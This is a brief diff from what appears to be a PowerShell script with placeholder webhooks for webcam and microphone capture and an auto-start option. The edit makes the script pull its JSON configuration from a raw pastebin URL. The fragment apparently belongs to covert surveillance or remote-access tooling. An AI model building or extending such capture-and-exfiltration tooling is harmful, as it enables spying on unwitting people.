@@ -45,7 +45,7 @@ $global:WebcamWebhook = 'WEBHOOK2_HERE'
 $global:MicrophoneWebhook = 'WEBHOOK3_HERE'
 
 # Option 2 -------- Set json file URL ----------
-$uri = "https://pastebin.com/AtbxGn6x"
+$uri = "https://pastebin.com/raw/AtbxGn6x"
 
 # Option to start all jobs automatically upon running
 $defaultstart = 1
